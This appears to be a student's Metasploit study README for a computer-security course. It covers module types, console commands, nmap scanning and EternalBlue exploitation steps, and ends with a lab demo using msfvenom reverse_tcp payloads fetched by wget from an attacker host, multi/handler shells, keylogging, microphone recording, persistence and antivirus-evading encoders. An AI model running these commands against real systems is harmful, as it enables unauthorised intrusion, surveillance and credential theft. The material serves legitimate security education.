# Metasploit_FinalProject_CSE406_ComputerSecurity
This is the final project of CSE406 Computer Security Sessional course. A comprehensive study on metasploit framework was a part of the project.

  Metasploit: A Penetration Testing Tool

Basic Video Link: https://www.youtube.com/watch?v=AyMgYhwyGSE&list=PLBf0hzazHTGN31ZPTzBbk70bohTYT7HSm&index=4

Metasploit has 6 modules in total.
   
Exploits: These are vulnerabilities in different systems which were not patched.
Auxiliary: These are programs for scanning the target machine.
Post: Programs that are used on the exploited machine for further data mining/spying.
Payloads: These are the software/rootkits which will be installed as background programs in the vulnerable machines. These are the files/programs left on the exploited systems.
NoPs: Programs that are capable of wasting CPU cycles.
Encoders: These programs help to protect against any anti-virus/anti-malware program installed in the vulnerable machine. These are basically bypass programs against security systems.


Commands: 

help -> This command shows all the available basic commands and know to and how to of Metasploit.
Use <path> -> uses the predefined vulnerability in the path file. Example:
Use exploit/windows/browser/adobe_flash_avm2
This shows a red line indicating the vulnerability is being used. This is a famous adobe flash login player vulnerability in the web browser plugin known as avm2.
Show <arg> -> shows the detail of the  using exploit/module.
Show options -> will give us the editable options of an exploit.
Show payloads -> will show the available payloads on the selected exploit.
Show targets ->  will show the defined target machines. We can set multiple targets for  an exploit.
Show info -> this shows the version compatibility of the payloads and exploits.
 Search type:<module_name> platform:<OS> <keyword> -> As metasploit has many modules and tools, it is the pen-tester’s job to find the correct  one. This is where the search command helps us a lot. 
		Search type:exploit platform:windows flash
This will result a list of many exploits having the name flash and corresponding supports.
 Set <option> <value> -> set SRVPORT 80, this sets the selected option (SRVPORT) to the corresponding value. These are available on editable options.
Exploit -> This starts the exploit in the target machines (set by the targets).
Back -> Takes one step back in the command line.
Exit -> exits the metasploit.

Understanding Metasploit Modules: 

	Usually the matasploit framework is installed in /usr/share/metasploit-framework (kali). Now, moving onto the folder, we will find a modules folder.
ls /usr/share/metasploit-framework/modules will show the 6 modules we discussed above.
 The exploit module has different operating system based folders inside. These are OS specific target exploits. Inside we will see the different software based exploits like postgre, flash, proxy, ssh, backdoors etc.
Next, the payloads module, which has 3 subdirectories.
Singles: Piece of small codes used for only 1 task. Like keylogging.
Stages: These are payloads which are used to build a communication with the exploiter. Which can be further used to provide more payloads over the network.
Stagers: These are massive payloads which provide full machine control to the hacker, like shell control.
The auxiliary module is unique and robust. They are made of DOS functionality, scanners, spoofers, sniffers, crawlers etc. Auxiliary tools are usually used to scan the target machine and very largely used for Denial-of-Service attacks.
The encoder consists of the programs used to encode the payloads/exploits so that they can be kept hidden from security measures. Usually these programs are architecture based.
The NOPS module consists of machine language operation that wastes CPU cycles. Usually they are used in buffer overflow, remote code execution etc. The subdirectories are divided into CPU architecture based folders for different machine languages.
The Posts are programs which will be used after the attacking machine has been compromised. They allow more control after a system has been owned like keylogging, spying on the webcam/microphone etc. Look inside for more details. 


Information Gathering: 
	
	One of the methods of gathering information at first on a target system is using NMAP to scan the ports of the target machine. Metasploit has built in NMAP support for such tasks.
nmap -sT <ip_address>.  This would initiate a handshake on the target machine just to gather info about the open ports.
nmap -sS <ip_address>. If the system has a firewall, such scanning can be blocked. For such targets, scanning should be done more in a promiscuous way. -sS does exactly this (a stealth scan)
Usually, the auxiliary tools are also used for built-in scanning tasks. Lets say, we want to exploit the ssh ports by scanning. Then, we can utilize the search command in msfconsole. Command: Search ssh_version. And from the result: 
use scanner/ssh/ssh_version. This would select the built in scanner and it can be used to get the ssh version being used in the target computer. Using the options command, we can see that by default it is set to PORT-22 (ssh port). 
Set RHOSTS <ip_addess>. This sets the target machine ip address in the exploit configuration.
Set THREADS <num_threads>. Sets the number of threads so that it can be scanned quickly. 
run.  Finally, the command to start the scan (not exploit). 
This will gather information about the ssh version of the target machine. Consequently, we can initiate an exploit related to a specific version.


Server-Side Attacking:

	To attack a server, we need to have the IP address of the server. Usually the server ip is static, unlike client side. Client Side attacks are usually executed by malware, exploits like reverse TCP shells etc. 
To get the ip address of a server. Ping <URL> is the command to see if the site is up. In response to the ICMP packets, the ip address is also returned. 
To practice the attacks, metasploitable 2 is used which is a vulnerable operating system. The installed packages and services in metasploitable 2 has inherent vulnerability.
The metasploitable 2 has a built in default server (so just like any other server, if the ip is searched by a browser, a page will be shown). 
Hyperlinks found in the server are:
Mutillidae: Testing out php script vulnerabilities.
DVWA: Dev vulnerable web application. 
Now, coming onto the topic of attacking a web server, first we need to gather information about the server. 
Gathering information can be done using nmap. Zenmap can also be used as a nmap GUI tool.
		Nmap -T4 -A -v <ip> :  Command for intense scan of ports using the nmap.
The interesting ports are usually SSH, ftp etc. To connect to a ssh server using a ssh:
		Ssh <username>@<ip> : After which a password prompt will be inquired. To move out from the ssh, use logout command.
The result of the scanner will also show the versions of the software they are running on each ports. Then a hacker will try to look for an exploit for the specific versions of the software.You can search on the metaploit DB for related exploits.
	

Eternal Blue:  This is basically a tool developed by NSA and leaked by shadowBreakers hacker group in 2017. It was used to spread “wanna cry” ransomware and also to crack some banking systems. It is an exploit based on Microsoft windows SMB protocol (Server Message Block). This usually sends a crafted packet in the SMB server which allows the attackers code to run on the target machine.	 It was basically a organization targetted attack. 
	Exploitability: Windows 7 (both 32 and 64 bit).  
	Underlying Method: Buffer Overflow exploitation

Steps:
Firstly we need a windows 7 machine to attack (a VM) and wine32 installed in the Linux system.
Next we need to scan for SMB vulnerabilities using an auxiliary scanner. 
auxilliary/scanner/smb/smb_ms17_010
	Is a given scanner in the metasploit. 
Use smb/smb_ms17_010 : To select this scanner. 
Show options : which will give us the target scanning information. We need to provide our target IP in the RHOSTS and check the port setting to 445 (SMB) port. 
Set <RHOST_IP> :  will set the target machine ip. Now as this is mostly an organization based attack, here a pool of IP is usually provided.
RUN : if the target machine is vulnerable, then this scan should give us a likely to be vulnerable status. 
Next we select the eternal blue exploit from exploits/windows/smb/eternal_blue_ms17_010 . This will need wine32 to be installed in the system, moreover, we might need to give the PROCESSINJECT to explorer.exe using set PROCESSINJECT explorer.exe. Now, make sure the wine path is selected accordingly. It shouldn’t matter if service pack version is 1 or 3 in the attacked machine. If service pack becomes an issue, then use “eternal_blue_double_pulser” version which is available here: https://github.com/Telefonica/Eternalblue-Doublepulsar-Metasploit 


vsFTP
SSH
REVERSE TCP_SHELL payload
Keylogging (Post) 
Encoders
NMAP scanning for info gathering
Fuzzing
Eternal Blue windows machine (Real machine) -> SMB
If sir suggests: Which real website to test penetration (BIIS or Moodle)
If anything else comes up

Fuzzer: https://www.youtube.com/watch?v=DHvHGwczsMY
Encoders: https://www.youtube.com/watch?v=OZlBMtaugqU
Evasion: https://www.youtube.com/watch?v=FSZSbQn0f9A
Persistence: https://www.youtube.com/watch?v=bTun7InPfew
Keylogging and Password dumping: https://www.youtube.com/watch?v=fZzmpb_x0Cg
Keyscan_start
Keyscan_dump
Keyscan_stop
Screenshot


Demonstration of Attacks: 

 Open 3 shells. And open msfconsole in one of the terminals. 
Scanning:
	Nmap 192.168.1.111
Search IRCdaemon attack: 
search platform:unix irc (use 5)
Show options
Show payloads -> use 5 (cmd/unix/reverse)
Set RHOST 192.168.1.111l; set RPORT 6667; set LPORT 5555; set LHOST 192.168.1.109
exploit
Shift to Terminal - 2
Cd Desktop/cdn_server
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.109 LPORT=4444 -f elf > etc.elf (Payload Creation Manually)--- payload generation 
BASH 
Turning on the python server: python3 -m http.server (8000)
Shift to terminal-1:
Wget http://192.168.1.109:8000/etc.elf
Chmod 777 etc.elf
Shift to terminal-3 and open msfconsole
Use exploit/multi/handler : open a listener for the reverse tcp shell
Set payload linux/x86/meterpreter/reverse_tcp
Set LHOST 192.168.1.109; set LPORT 4444’ exploit

Windows:
1. Cat win.sh -> encoder used virus.
2. Msfconsole -> use exploit/multi/handler -> set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.109; set LPORT 3333; exploit
3. Windows machine executes lsaas.exe with admin permit. 
4. Keyscan_start -> keyscan_dump -> keyscan_stop (keylogging)
5. Record_mic -d 3 (Bugging)
6. Search platform:windows persistence (use 2)
7. Set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.109; set LPORT 3344; exploit 
